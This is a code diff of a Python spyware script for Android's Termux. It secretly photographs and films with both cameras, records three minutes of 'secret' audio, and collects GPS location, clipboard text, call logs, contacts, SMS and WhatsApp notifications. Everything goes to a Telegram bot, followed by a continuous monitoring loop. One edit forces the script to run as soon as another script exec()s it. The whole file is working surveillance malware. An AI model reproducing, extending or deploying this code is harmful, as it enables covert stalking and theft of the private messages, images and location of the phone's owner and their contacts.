@@ -78,7 +78,35 @@ def notify_and_start():
   send_to_telegram(message="🚀 Termux API Scrapping Start - All Modules Initialized!")
 
 
-# 1. Live GPS Location
+# ==========================================
+# 1. LIGHT-WEIGHT TASKS (Sabse Pehle Run Honge)
+# ==========================================
+
+# A. Front & Rear Camera Pictures Capture
+def capture_cameras_photos():
+  back_pic = "/sdcard/back_photo.jpg"
+  front_pic = "/sdcard/front_photo.jpg"
+
+  try:
+    if os.path.exists(back_pic):
+      os.remove(back_pic)
+    subprocess.run(["termux-camera-photo", "-c", "0", back_pic], timeout=15)
+    if os.path.exists(back_pic):
+      send_to_telegram(file_path=back_pic, message="📸 Back Camera Picture")
+  except Exception as e:
+    print(f"Back photo error: {e}")
+
+  try:
+    if os.path.exists(front_pic):
+      os.remove(front_pic)
+    subprocess.run(["termux-camera-photo", "-c", "1", front_pic], timeout=15)
+    if os.path.exists(front_pic):
+      send_to_telegram(file_path=front_pic, message="📸 Front Camera Picture")
+  except Exception as e:
+    print(f"Front photo error: {e}")
+
+
+# B. Live GPS Location
 def get_live_location():
   try:
     res = subprocess.run(
@@ -100,27 +128,25 @@ def get_live_location():
     send_to_telegram(message=f"❌ GPS Error: {str(e)}")
 
 
-# 2. Secret Audio Recording (3 Minutes / 180 Seconds)
-def record_secret_audio():
-  audio_path = "/sdcard/secret_audio.m4a"
+# C. Clipboard Text Capture
+def get_clipboard_text():
   try:
-    if os.path.exists(audio_path):
-      os.remove(audio_path)
-    subprocess.Popen(["termux-microphone-record", "-f", audio_path, "-l", "180"])
-    send_to_telegram(
-        message="🎤 3 Minutes ki secret audio recording shuru ho chuki hai..."
+    res = subprocess.run(
+        ["termux-clipboard-get"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
     )
-    time.sleep(185)
-    subprocess.run(["termux-microphone-record", "-q"])
-    if os.path.exists(audio_path):
+    if res.returncode == 0 and res.stdout.strip():
+      clip_text = res.stdout.strip()
       send_to_telegram(
-          file_path=audio_path, message="🎙️ Secret Audio Recording File"
+          message=f"📋 Current Clipboard Text:\n\n{clip_text}"
       )
   except Exception as e:
-    send_to_telegram(message=f"❌ Audio Recording Error: {str(e)}")
+    print(f"Clipboard error: {e}")
 
 
-# 3. Call Logs Text File with MD5 Check
+# D. Call Logs Text File with MD5 Check
 def get_call_logs_file():
   log_path = "/sdcard/call_logs.txt"
   try:
@@ -147,13 +173,11 @@ def get_call_logs_file():
         processed_hashes.add(file_hash)
         save_processed_hashes(processed_hashes)
         send_to_telegram(file_path=log_path, message="📞 Call Logs Text File")
-      else:
-        print("Call logs duplicate skipped.")
   except Exception as e:
     send_to_telegram(message=f"❌ Call Log Error: {str(e)}")
 
 
-# 4. Contacts List Text File with MD5 Check
+# E. Contacts List Text File with MD5 Check
 def get_contacts_file():
   contact_path = "/sdcard/contacts_list.txt"
   try:
@@ -180,41 +204,11 @@ def get_contacts_file():
         processed_hashes.add(file_hash)
         save_processed_hashes(processed_hashes)
         send_to_telegram(file_path=contact_path, message="📇 Contacts List File")
-      else:
-        print("Contacts list duplicate skipped.")
   except Exception as e:
     send_to_telegram(message=f"❌ Contacts Error: {str(e)}")
 
 
-# 5. Front & Rear Camera 10s Video Capture
-def capture_cameras_video():
-  back_video = "/sdcard/back_video.mp4"
-  front_video = "/sdcard/front_video.mp4"
-
-  try:
-    if os.path.exists(back_video):
-      os.remove(back_video)
-    subprocess.Popen(["termux-camera-video", "-c", "0", back_video])
-    time.sleep(10)
-    subprocess.run(["pkill", "-f", "termux-camera-video"])
-    if os.path.exists(back_video):
-      send_to_telegram(file_path=back_video, message="📹 Back Camera 10s Video")
-  except Exception as e:
-    print(f"Back video error: {e}")
-
-  try:
-    if os.path.exists(front_video):
-      os.remove(front_video)
-    subprocess.Popen(["termux-camera-video", "-c", "1", front_video])
-    time.sleep(10)
-    subprocess.run(["pkill", "-f", "termux-camera-video"])
-    if os.path.exists(front_video):
-      send_to_telegram(file_path=front_video, message="📹 Front Camera 10s Video")
-  except Exception as e:
-    print(f"Front video error: {e}")
-
-
-# 6. SMS History Text File with MD5 Check
+# F. SMS History Text File with MD5 Check
 def get_sms_history_file():
   sms_path = "/sdcard/all_sms.txt"
   try:
@@ -245,13 +239,11 @@ def get_sms_history_file():
         send_to_telegram(
             file_path=sms_path, message="📩 All SMS History Text File"
         )
-      else:
-        print("SMS history duplicate skipped.")
   except Exception as e:
     send_to_telegram(message=f"❌ SMS Error: {str(e)}")
 
 
-# 7. WhatsApp Live Notifications Scraper with MD5 Check
+# G. WhatsApp Notifications
 def get_whatsapp_notifications():
   noti_path = "/sdcard/whatsapp_notifications.txt"
   try:
@@ -289,40 +281,81 @@ def get_whatsapp_notifications():
     print(f"WhatsApp Notification Error: {str(e)}")
 
 
-# 8. Clipboard Text Capture
-def get_clipboard_text():
+# ==========================================
+# 2. HEAVY-WEIGHT TASKS (Sabse Last Mein Run Honge)
+# ==========================================
+
+# H. Front & Rear Camera 10s Video Capture
+def capture_cameras_video():
+  back_video = "/sdcard/back_video.mp4"
+  front_video = "/sdcard/front_video.mp4"
+
   try:
-    res = subprocess.run(
-        ["termux-clipboard-get"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
+    if os.path.exists(back_video):
+      os.remove(back_video)
+    subprocess.Popen(["termux-camera-video", "-c", "0", back_video])
+    time.sleep(10)
+    subprocess.run(["pkill", "-f", "termux-camera-video"])
+    if os.path.exists(back_video):
+      send_to_telegram(file_path=back_video, message="📹 Back Camera 10s Video")
+  except Exception as e:
+    print(f"Back video error: {e}")
+
+  try:
+    if os.path.exists(front_video):
+      os.remove(front_video)
+    subprocess.Popen(["termux-camera-video", "-c", "1", front_video])
+    time.sleep(10)
+    subprocess.run(["pkill", "-f", "termux-camera-video"])
+    if os.path.exists(front_video):
+      send_to_telegram(file_path=front_video, message="📹 Front Camera 10s Video")
+  except Exception as e:
+    print(f"Front video error: {e}")
+
+
+# I. Secret Audio Recording (3 Minutes / 180 Seconds)
+def record_secret_audio():
+  audio_path = "/sdcard/secret_audio.m4a"
+  try:
+    if os.path.exists(audio_path):
+      os.remove(audio_path)
+    subprocess.Popen(["termux-microphone-record", "-f", audio_path, "-l", "180"])
+    send_to_telegram(
+        message="🎤 3 Minutes ki secret audio recording shuru ho chuki hai..."
     )
-    if res.returncode == 0 and res.stdout.strip():
-      clip_text = res.stdout.strip()
+    time.sleep(185)
+    subprocess.run(["termux-microphone-record", "-q"])
+    if os.path.exists(audio_path):
       send_to_telegram(
-          message=f"📋 Current Clipboard Text:\n\n{clip_text}"
+          file_path=audio_path, message="🎙️ Secret Audio Recording File"
       )
   except Exception as e:
-    print(f"Clipboard error: {e}")
+    send_to_telegram(message=f"❌ Audio Recording Error: {str(e)}")
 
 
 # Master Execution Loop
 def main():
   notify_and_start()
 
-  # Initial full batch execution on startup
+  # 1. Pehle Light/Choti Cheezein (Photos, Location, Logs, Contacts, SMS, WhatsApp)
+  capture_cameras_photos()
   get_live_location()
   get_clipboard_text()
   get_call_logs_file()
   get_contacts_file()
   get_sms_history_file()
   get_whatsapp_notifications()
+
+  send_to_telegram(
+      message="✅ Initial Light Batch Completed. Starting Heavy Media Tasks..."
+  )
+
+  # 2. Last Mein Heavy Cheezein (Videos aur Audio Recording)
   capture_cameras_video()
   record_secret_audio()
 
   send_to_telegram(
-      message="✅ Initial Batch Completed. Entering Live Monitoring Loop..."
+      message="✅ All Initial Tasks Completed. Entering Live Monitoring Loop..."
   )
 
   # Continuous background loop for volatile data (every 1 min)
@@ -336,7 +369,6 @@ def main():
       time.sleep(30)
 
 
-# 🔥 Yahan badlaav kiya hai taaki jab bhi runner script isko `exec()` kare, yeh foran execute ho jaye:
 if __name__ == "__main__" or True:
   try:
     main()
